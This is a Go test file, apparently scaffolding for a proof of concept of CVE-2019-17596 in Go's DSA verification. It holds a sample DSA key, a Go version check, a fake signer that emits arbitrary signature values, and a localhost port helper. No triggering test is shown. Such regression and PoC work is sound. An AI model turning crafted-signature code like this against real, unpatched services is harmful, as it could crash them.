package poc_dsa_verify_CVE_2019_17596

import (
	"crypto"
	"crypto/dsa"
	"encoding/asn1"
	"io"
	"math/big"
	"net"
	"regexp"
	"runtime"
	"strconv"
	"testing"

	"github.com/stretchr/testify/require"
)

func examplePrivateKey() *dsa.PrivateKey {
	// from https://github.com/golang/go/blob/go1.13.1/src/crypto/dsa/dsa_test.go#L85-L95
	return &dsa.PrivateKey{
		PublicKey: dsa.PublicKey{
			Parameters: dsa.Parameters{
				P: fromHex("A9B5B793FB4785793D246BAE77E8FF63CA52F442DA763C440259919FE1BC1D6065A9350637A04F75A2F039401D49F08E066C4D275A5A65DA5684BC563C14289D7AB8A67163BFBF79D85972619AD2CFF55AB0EE77A9002B0EF96293BDD0F42685EBB2C66C327079F6C98000FBCB79AACDE1BC6F9D5C7B1A97E3D9D54ED7951FEF"),
				Q: fromHex("E1D3391245933D68A0714ED34BBCB7A1F422B9C1"),
				G: fromHex("634364FC25248933D01D1993ECABD0657CC0CB2CEED7ED2E3E8AECDFCDC4A25C3B15E9E3B163ACA2984B5539181F3EFF1A5E8903D71D5B95DA4F27202B77D2C44B430BB53741A8D59A8F86887525C9F2A6A5980A195EAA7F2FF910064301DEF89D3AA213E1FAC7768D89365318E370AF54A112EFBA9246D9158386BA1B4EEFDA"),
			},
			Y: fromHex("32969E5780CFE1C849A1C276D7AEB4F38A23B591739AA2FE197349AEEBD31366AEE5EB7E6C6DDB7C57D02432B30DB5AA66D9884299FAA72568944E4EEDC92EA3FBC6F39F53412FBCC563208F7C15B737AC8910DBC2D9C9B8C001E72FDC40EB694AB1F06A5A2DBD18D9E36C66F31F566742F11EC0A52E9F7B89355C02FB5D32D2"),
		},
		X: fromHex("5078D4D29795CBE76D3AACFE48C9AF0BCDBEE91A"),
	}
}

func fromHex(s string) *big.Int {
	result, ok := new(big.Int).SetString(s, 16)
	if !ok {
		panic(s)
	}
	return result
}

func goVersion(t *testing.T) (int, int, int) {
	re := regexp.MustCompile(`go(?P<major>\d+)\.(?P<minor>\d+)(\.(?P<patch>\d+))*(?P<extra>.*)`)
	vmatch := re.FindAllStringSubmatch(runtime.Version(), -1)[0]
	major, err := strconv.Atoi(vmatch[1])
	require.NoError(t, err)
	minor, err := strconv.Atoi(vmatch[2])
	require.NoError(t, err)
	var patch = 0
	if vmatch[4] != "" {
		patch, err = strconv.Atoi(vmatch[4])
		require.NoError(t, err)
	}
	return major, minor, patch
}

func isFixed(t *testing.T) bool {
	major, minor, patch := goVersion(t)
	return (major >= 1 && minor >= 13 && patch >= 3 || (major >= 1 && minor > 13))
}

// https://go-review.googlesource.com/c/go/+/10952
type fakeSigner struct {
	R      *big.Int
	S      *big.Int
	public dsa.PublicKey
}

type dsaSignature struct {
	R *big.Int
	S *big.Int
}

func (fs *fakeSigner) Public() crypto.PublicKey {
	return &fs.public
}

func (fs *fakeSigner) Sign(rand io.Reader, msg []byte, opts crypto.SignerOpts) ([]byte, error) {
	return asn1.Marshal(dsaSignature{fs.R, fs.S})
}

var _ crypto.Signer = (*fakeSigner)(nil)

func getRandomPort() (int, error) {
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return 0, err
	}
	defer l.Close()
	return l.Addr().(*net.TCPAddr).Port, nil
}
